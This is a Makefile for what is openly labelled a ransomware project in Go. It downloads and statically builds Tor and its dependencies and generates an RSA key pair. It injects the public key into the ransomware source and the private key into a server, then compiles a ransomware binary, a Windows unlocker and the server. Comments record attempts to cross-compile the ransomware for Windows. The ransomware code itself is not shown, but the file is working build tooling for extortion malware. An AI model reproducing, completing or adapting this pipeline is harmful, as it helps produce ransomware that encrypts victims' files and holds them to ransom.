.PHONY: all

all: build clean

BUILD_DIR = $(shell pwd)/build
BIN_DIR = $(shell pwd)/bin

LIBEVENT_VERSION = 2.0.22-stable
OPENSSL_VERSION = 0.9.8ze
ZLIB_VERSION = 1.2.8
TOR_VERSION = 0.2.5.12

download-libs:
	mkdir -p $(BUILD_DIR)
	wget -qO- https://github.com/libevent/libevent/releases/download/release-$(LIBEVENT_VERSION)/libevent-$(LIBEVENT_VERSION).tar.gz | tar xvz -C ./build
	wget -qO- https://www.openssl.org/source/openssl-$(OPENSSL_VERSION).tar.gz | tar xvz -C ./build
	wget -qO- http://zlib.net/zlib-$(ZLIB_VERSION).tar.gz | tar xvz -C ./build
	wget -qO- https://www.torproject.org/dist/tor-$(TOR_VERSION).tar.gz | tar xvz -C ./build

build-libevent:
	cd $(BUILD_DIR)/libevent-$(LIBEVENT_VERSION); ./configure --disable-shared --enable-static --with-pic --prefix $(BUILD_DIR)/opt\
		&& make && make install

build-zlib:
	cd $(BUILD_DIR)/zlib-$(ZLIB_VERSION); CFLAGS="-fPIC" ./configure --static --prefix $(BUILD_DIR)/opt \
            && make && make install

build-openssl:
	cd $(BUILD_DIR)/openssl-$(OPENSSL_VERSION); ./config -fPIC no-shared no-dso zlib --prefix=$(BUILD_DIR)/opt \
		--openssldir=$(BUILD_DIR)/opt \
        && make && make install

build-tor:
	cd $(BUILD_DIR)/tor-$(TOR_VERSION); sed -i 's/extern const char tor_git_revision/const char tor_git_revision/' src/or/config.c
	cd $(BUILD_DIR)/tor-$(TOR_VERSION); ./configure --enable-static-tor \
		--with-libevent-dir=$(BUILD_DIR)/opt \
		--with-openssl-dir=$(BUILD_DIR)/opt/lib \
		--with-zlib-dir=$(BUILD_DIR)/opt \
		--prefix=$(BUILD_DIR)/opt \
		&& make && make install

build-static-libs: download-libs build-libevent build-zlib build-openssl build-tor

pre-build: build-static-libs
	mkdir -p $(BUILD_DIR)/ransomware
	mkdir -p $(BUILD_DIR)/server
	mkdir -p $(BUILD_DIR)/unlocker
	openssl genrsa -out $(BUILD_DIR)/server/private.pem 2048
	openssl rsa -in $(BUILD_DIR)/server/private.pem -outform PEM -pubout -out $(BUILD_DIR)/ransomware/public.pem
	# RSRC is currently not compatible in this branch
	# rsrc -manifest ransomware.manifest -ico icon.ico -o build/ransomware/ransomware.syso
	cp -r cmd/ransomware $(BUILD_DIR)
	cp -r server $(BUILD_DIR)
	cp -r cmd/unlocker $(BUILD_DIR)
	cd $(BUILD_DIR)/ransomware && perl -pi -e 's/INJECT_PUB_KEY_HERE/`echo -n "\n"; cat public.pem`/e' ransomware.go
	cd $(BUILD_DIR)/server && perl -pi -e 's/INJECT_PRIV_KEY_HERE/`echo -n "\n"; cat private.pem`/e' main.go
	mkdir -p $(BIN_DIR)

binaries:
	# I'm trying the following command for cross compilation, but thrown multiple conflicts :(
	# First install the gcc-mingw-w64 and gcc-multilib
	#
	# cd $(BUILD_DIR)/ransomware; env GOOS=windows CGO_ENABLED=1 GOARCH=386 CC=i686-w64-mingw32-gcc go build --ldflags '-extldflags "-static" -H windowsgui' ransomware.go -o $(BIN_DIR)/ransomware.exe
	#
	# Above the linux native compilation, it's working fine
	cd $(BUILD_DIR)/ransomware; go build --ldflags '-extldflags "-static"' -o $(BIN_DIR)/ransomware
	cd $(BUILD_DIR)/unlocker && env GOOS=windows go build -o $(BIN_DIR)/unlocker.exe
	cd $(BUILD_DIR)/server && go build && mv `ls|grep server` $(BIN_DIR)

build: pre-build binaries

clean:
	rm -r $(BUILD_DIR)
